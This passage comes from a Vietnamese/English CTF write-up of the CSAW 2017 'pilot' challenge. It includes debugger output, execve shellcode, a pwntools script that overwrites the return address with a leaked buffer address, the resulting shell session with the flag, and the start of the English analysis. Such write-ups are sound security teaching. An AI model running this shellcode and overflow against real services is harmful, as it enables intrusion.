</span><span class="o">*</span><span class="n">R9</span><span class="w">   </span><span class="mh">0x7f1789090600</span><span class="w"> </span><span class="p">(</span><span class="err">_</span><span class="n">IO_2_1_stdout_</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">xchg</span><span class="w">   </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">rax</span><span class="p">],</span><span class="w"> </span><span class="n">ebp</span><span class="w"> </span><span class="o">/*</span><span class="w"> </span><span class="mh">0xfbad2887</span><span class="w"> </span><span class="o">*/</span><span class="w">
</span><span class="o">*</span><span class="n">R10</span><span class="w">  </span><span class="mh">0x60d</span><span class="w">
</span><span class="o">*</span><span class="n">R11</span><span class="w">  </span><span class="mh">0x246</span><span class="w">
</span><span class="o">*</span><span class="n">R12</span><span class="w">  </span><span class="mh">0x4008b0</span><span class="w"> </span><span class="p">(</span><span class="n">entry0</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">xor</span><span class="w">    </span><span class="n">ebp</span><span class="p">,</span><span class="w"> </span><span class="n">ebp</span><span class="w">
</span><span class="o">*</span><span class="n">R13</span><span class="w">  </span><span class="mh">0x7fffffffe1a0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mh">0x1</span><span class="w">
 </span><span class="n">R14</span><span class="w">  </span><span class="mh">0x0</span><span class="w">
 </span><span class="n">R15</span><span class="w">  </span><span class="mh">0x0</span><span class="w">
</span><span class="o">*</span><span class="n">RBP</span><span class="w">  </span><span class="mh">0x7fffffffe0c0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x400b90</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">r15</span><span class="w">
</span><span class="o">*</span><span class="n">RSP</span><span class="w">  </span><span class="mh">0x7fffffffe0a0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x400b90</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">r15</span><span class="w">
</span><span class="o">*</span><span class="n">RIP</span><span class="w">  </span><span class="mh">0x400ae0</span><span class="w"> </span><span class="p">(</span><span class="n">main</span><span class="m">+314</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">call</span><span class="w">   </span><span class="mh">0x400820</span><span class="w">
</span><span class="p">[</span><span class="err">────────────────────────────────────────────────────────────────────</span><span class="n">DISASM</span><span class="err">────────────────────────────────────────────────────────────────────</span><span class="p">]</span><span class="w">
 </span><span class="err">►</span><span class="w"> </span><span class="mh">0x400ae0</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="m">+314</span><span class="o">&gt;</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="n">read</span><span class="o">@</span><span class="n">plt</span><span class="w">                      </span><span class="o">&lt;</span><span class="mh">0x400820</span><span class="o">&gt;</span><span class="w">
        </span><span class="n">fd</span><span class="o">:</span><span class="w"> </span><span class="mh">0x0</span><span class="w">
        </span><span class="n">buf</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7fffffffe0a0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x400b90</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">r15</span><span class="w">
        </span><span class="n">nbytes</span><span class="o">:</span><span class="w"> </span><span class="mh">0x40</span><span class="w">
</span></pre></table></code></div></div><p>Như vậy ta thấy ngay địa chỉ của buffer khi đọc vào đã được in ra. Vậy thì exploit quá đơn giản rồi, chỉ cần đặt shellcode lên buffẻr và ghi đè return address bằng địa chỉ buffer thôi. Shellcode của mình có chỉnh sửa một chút ở instruction đầu tiên để nới rộng stack dành cho shellcode.</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="w">   </span><span class="m">0</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="m">83</span><span class="w"> </span><span class="n">ec</span><span class="w"> </span><span class="m">48</span><span class="w">             </span><span class="n">sub</span><span class="w">    </span><span class="n">rsp</span><span class="p">,</span><span class="mh">0x48</span><span class="w">
   </span><span class="m">4</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="n">d2</span><span class="w">                </span><span class="n">xor</span><span class="w">    </span><span class="n">rdx</span><span class="p">,</span><span class="n">rdx</span><span class="w">
   </span><span class="m">7</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="n">bb</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="m">2</span><span class="n">f</span><span class="w"> </span><span class="m">62</span><span class="w"> </span><span class="m">69</span><span class="w"> </span><span class="m">6</span><span class="n">e</span><span class="w">    </span><span class="n">movabs</span><span class="w"> </span><span class="n">rbx</span><span class="p">,</span><span class="mh">0x68732f6e69622fff</span><span class="w">
   </span><span class="n">e</span><span class="o">:</span><span class="w">   </span><span class="m">2</span><span class="n">f</span><span class="w"> </span><span class="m">73</span><span class="w"> </span><span class="m">68</span><span class="w"> 
  </span><span class="m">11</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="n">c1</span><span class="w"> </span><span class="n">eb</span><span class="w"> </span><span class="m">08</span><span class="w">             </span><span class="n">shr</span><span class="w">    </span><span class="n">rbx</span><span class="p">,</span><span class="mh">0x8</span><span class="w">
  </span><span class="m">15</span><span class="o">:</span><span class="w">   </span><span class="m">53</span><span class="w">                      </span><span class="n">push</span><span class="w">   </span><span class="n">rbx</span><span class="w">
  </span><span class="m">16</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="m">89</span><span class="w"> </span><span class="n">e7</span><span class="w">                </span><span class="n">mov</span><span class="w">    </span><span class="n">rdi</span><span class="p">,</span><span class="n">rsp</span><span class="w">
  </span><span class="m">19</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="n">c0</span><span class="w">                </span><span class="n">xor</span><span class="w">    </span><span class="n">rax</span><span class="p">,</span><span class="n">rax</span><span class="w">
  </span><span class="m">1</span><span class="n">c</span><span class="o">:</span><span class="w">   </span><span class="m">50</span><span class="w">                      </span><span class="n">push</span><span class="w">   </span><span class="n">rax</span><span class="w">
  </span><span class="m">1</span><span class="n">d</span><span class="o">:</span><span class="w">   </span><span class="m">57</span><span class="w">                      </span><span class="n">push</span><span class="w">   </span><span class="n">rdi</span><span class="w">
  </span><span class="m">1</span><span class="n">e</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="m">89</span><span class="w"> </span><span class="n">e6</span><span class="w">                </span><span class="n">mov</span><span class="w">    </span><span class="n">rsi</span><span class="p">,</span><span class="n">rsp</span><span class="w">
  </span><span class="m">21</span><span class="o">:</span><span class="w">   </span><span class="n">b0</span><span class="w"> </span><span class="m">3</span><span class="n">b</span><span class="w">                   </span><span class="n">mov</span><span class="w">    </span><span class="n">al</span><span class="p">,</span><span class="mh">0x3b</span><span class="w">
  </span><span class="m">23</span><span class="o">:</span><span class="w">   </span><span class="m">0</span><span class="n">f</span><span class="w"> </span><span class="m">05</span><span class="w">                   </span><span class="n">syscall</span><span class="w">
</span></pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>

<span class="n">s</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">pwn.chal.csaw.io</span><span class="sh">'</span><span class="p">,</span> <span class="mi">8464</span><span class="p">)</span>

<span class="nf">raw_input</span><span class="p">(</span><span class="sh">'</span><span class="s">Exploit?</span><span class="sh">'</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x48\x83\xEC\x48\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05</span><span class="sh">"</span>

<span class="n">s</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">[*]Location:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">leak_buffer</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
<span class="k">print</span> <span class="n">leak_buffer</span>
<span class="n">leak_buffer</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">leak_buffer</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">[*]Command:</span><span class="sh">'</span><span class="p">)</span>

<span class="k">print</span> <span class="sh">'</span><span class="s">Shellcode is at:</span><span class="sh">'</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">leak_buffer</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sh">''</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">40</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">leak_buffer</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</pre></table></code></div></div><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">python</span><span class="w"> </span><span class="n">exploit.py</span><span class="w"> 
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Opening</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">pwn.chal.csaw.io</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="m">8464</span><span class="o">:</span><span class="w"> </span><span class="n">Done</span><span class="w">
</span><span class="n">Exploit</span><span class="o">?</span><span class="w">
</span><span class="mh">0x7ffe3cf25d80</span><span class="w">
</span><span class="n">Shellcode</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">at</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7ffe3cf25d80</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Switching</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">interactive</span><span class="w"> </span><span class="n">mode</span><span class="w">
</span><span class="o">$</span><span class="w"> </span><span class="n">id</span><span class="w">
</span><span class="n">uid</span><span class="o">=</span><span class="m">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="m">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="m">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span><span class="w">
</span><span class="o">$</span><span class="w"> </span><span class="n">whoami</span><span class="w">
</span><span class="n">pilot</span><span class="w">
</span><span class="o">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="w">
</span><span class="n">flag</span><span class="p">{</span><span class="m">1</span><span class="n">nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys</span><span class="p">}</span><span class="w">
</span><span class="o">$</span><span class="w">  
</span></pre></table></code></div></div><p><a name="english-pilot"></a></p><h6 id="english">English</h6><p>This is a basic stack overflow challenge. Let’s check out the file info.</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">file</span><span class="w"> </span><span class="n">pilot</span><span class="w">
</span><span class="n">pilot</span><span class="o">:</span><span class="w"> </span><span class="n">ELF</span><span class="w"> </span><span class="m">64</span><span class="o">-</span><span class="n">bit</span><span class="w"> </span><span class="n">LSB</span><span class="w"> </span><span class="n">executable</span><span class="p">,</span><span class="w"> </span><span class="n">x86</span><span class="m">-64</span><span class="p">,</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">(</span><span class="n">SYSV</span><span class="p">),</span><span class="w"> </span><span class="n">dynamically</span><span class="w"> </span><span class="n">linked</span><span class="p">,</span><span class="w"> </span><span class="n">interpreter</span><span class="w"> </span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="m">-64</span><span class="n">.so.2</span><span class="p">,</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="m">2.6.32</span><span class="p">,</span><span class="w"> </span><span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="m">6</span><span class="n">ed26a43b94fd3ff1dd15964e4106df72c01dc6c</span><span class="p">,</span><span class="w"> </span><span class="n">stripped</span><span class="w">
</span></pre></table></code></div></div><p>The information shows that this is a stripped 64-bit binary. A stripped binary is harder to debug. Fortunately, there is a tool that makes debugging stripped binaries slightly easier.</p><p>Let’s check security settings on this binary using checksec.</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">checksec</span><span class="w"> </span><span class="n">pilot</span><span class="w"> 
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="s1">'/root/workspace/ctfs/2017/csaw/pwn/pilot/pilot'</span><span class="w">
    </span><span class="n">Arch</span><span class="o">:</span><span class="w">     </span><span class="n">amd64</span><span class="m">-64</span><span class="o">-</span><span class="n">little</span><span class="w">
    </span><span class="n">RELRO</span><span class="o">:</span><span class="w">    </span><span class="n">Partial</span><span class="w"> </span><span class="n">RELRO</span><span class="w">
    </span><span class="n">Stack</span><span class="o">:</span><span class="w">    </span><span class="n">No</span><span class="w"> </span><span class="n">canary</span><span class="w"> </span><span class="n">found</span><span class="w">
    </span><span class="n">NX</span><span class="o">:</span><span class="w">       </span><span class="n">NX</span><span class="w"> </span><span class="n">disabled</span><span class="w">
    </span><span class="n">PIE</span><span class="o">:</span><span class="w">      </span><span class="n">No</span><span class="w"> </span><span class="n">PIE</span><span class="w"> </span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="w">
    </span><span class="n">RWX</span><span class="o">:</span><span class="w">      </span><span class="n">Has</span><span class="w"> </span><span class="n">RWX</span><span class="w"> </span><span class="n">segments</span><span class="w">
</span></pre></table></code></div></div><p>Almost no protection! Let’s run the binary.</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">.</span><span class="o">/</span><span class="n">pilot</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Welcome</span><span class="w"> </span><span class="n">DropShip</span><span class="w"> </span><span class="n">Pilot...</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">I</span><span class="w"> </span><span class="n">am</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">assitant</span><span class="w"> </span><span class="n">A.I....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">I</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">guiding</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">through</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">tutorial....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">As</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">first</span><span class="w"> </span><span class="n">step</span><span class="p">,</span><span class="w"> </span><span class="n">lets</span><span class="w"> </span><span class="n">learn</span><span class="w"> </span><span class="n">how</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">land</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">designated</span><span class="w"> </span><span class="n">location....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Your</span><span class="w"> </span><span class="n">mission</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">lead</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">dropship</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">location</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="n">sequence</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">instructions</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">Marines</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Medics...</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Good</span><span class="w"> </span><span class="n">Luck</span><span class="w"> </span><span class="n">Pilot</span><span class="o">!</span><span class="n">....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Location</span><span class="o">:</span><span class="mh">0x7fff0ef02250</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Command</span><span class="o">:</span><span class="w">
</span></pre></table></code></div></div><p>The location in the output seems a lot like an address in the program, probably the address of the buffer. Let’s open it in radare2 to double check.</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">r2</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w"> </span><span class="n">pilot</span><span class="w">                           
</span><span class="p">[</span><span class="mh">0x004008b0</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">afl</span><span class="w">
</span><span class="mh">0x004007c8</span><span class="w">    </span><span class="m">3</span><span class="w"> </span><span class="m">26</span><span class="w">           </span><span class="n">sub.__gmon_start___248_7c8</span><span class="w">
</span><span class="mh">0x00400800</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">32</span><span class="w">   </span><span class="n">sym.imp.setvbuf</span><span class="w">
</span><span class="mh">0x00400810</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZNSt8ios_base4InitC1Ev_32_810</span><span class="w">
</span><span class="mh">0x00400820</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sym.imp.read</span><span class="w">
</span><span class="mh">0x00400830</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sym.imp.__libc_start_main</span><span class="w">
</span><span class="mh">0x00400840</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sym.imp.__cxa_atexit</span><span class="w">
</span><span class="mh">0x00400850</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZNSt8ios_base4InitD1Ev_64_850</span><span class="w">
</span><span class="mh">0x00400860</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_72_860</span><span class="w">
</span><span class="mh">0x00400870</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZNSolsEPKv_80_870</span><span class="w">
</span><span class="mh">0x00400880</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZNSolsEPFRSoS_E_88_880</span><span class="w">
</span><span class="mh">0x00400890</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__96_890</span><span class="w">
</span><span class="mh">0x004008a0</span><span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">16</span><span class="w">           </span><span class="n">sub.__gmon_start___248_8a0</span><span class="w">
</span><span class="mh">0x004008b0</span><span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">41</span><span class="w">           </span><span class="n">entry0</span><span class="w">
</span><span class="mh">0x004008e0</span><span class="w">    </span><span class="m">4</span><span class="w"> </span><span class="m">50</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">41</span><span class="w">   </span><span class="n">fcn.004008e0</span><span class="w">
</span><span class="mh">0x004009a6</span><span class="w">    </span><span class="m">4</span><span class="w"> </span><span class="m">400</span><span class="w">          </span><span class="n">main</span><span class="w">
</span><span class="mh">0x00400b36</span><span class="w">    </span><span class="m">4</span><span class="w"> </span><span class="m">62</span><span class="w">           </span><span class="n">sub.std</span><span class="o">::</span><span class="n">ios_base</span><span class="o">::</span><span class="n">Init.Init___b36</span><span class="w">
</span><span class="p">[</span><span class="mh">0x004008b0</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> 
</span></pre></table></code></div></div><p>This looks quite intimidating as the binary was stripped. <a href="https://github.com/danigargu/syms2elf">syms2elf</a> is a tool that can be used in both radare2 and IDA to add symbols back to the symbol table of the stripped binary. Without the symbols, it is harder to navigate while debugging in gdb. This makes debugging way more comfortable. You can rename functions before adding symbols back to the binary. To export the modified binary with symbols added: <code class="language-plaintext highlighter-rouge">$syms2elf pilot_unstripped</code>.</p><p>Set a breakpoint at the call to <code class="language-plaintext highlighter-rouge">read@plt</code> in the main function to see where the input is written:</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">r</span><span class="w">
</span><span class="n">Starting</span><span class="w"> </span><span class="n">program</span><span class="o">:</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="n">ctfs</span><span class="o">/</span><span class="m">2017</span><span class="o">/</span><span class="n">csaw</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">pilot</span><span class="o">/</span><span class="n">pilot_unstripped</span><span class="w"> 
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Welcome</span><span class="w"> </span><span class="n">DropShip</span><span class="w"> </span><span class="n">Pilot...</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">I</span><span class="w"> </span><span class="n">am</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">assitant</span><span class="w"> </span><span class="n">A.I....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">I</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">guiding</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">through</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">tutorial....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">As</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">first</span><span class="w"> </span><span class="n">step</span><span class="p">,</span><span class="w"> </span><span class="n">lets</span><span class="w"> </span><span class="n">learn</span><span class="w"> </span><span class="n">how</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">land</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">designated</span><span class="w"> </span><span class="n">location....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Your</span><span class="w"> </span><span class="n">mission</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">lead</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">dropship</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">location</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="n">sequence</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">instructions</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">Marines</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Medics...</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Good</span><span class="w"> </span><span class="n">Luck</span><span class="w"> </span><span class="n">Pilot</span><span class="o">!</span><span class="n">....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Location</span><span class="o">:</span><span class="mh">0x7fffffffe0a0</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Command</span><span class="o">:</span><span class="w">
</span><span class="n">Breakpoint</span><span class="w"> </span><span class="m">1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0000000000400ae0</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">main</span><span class="w"> </span><span class="p">()</span><span class="w">
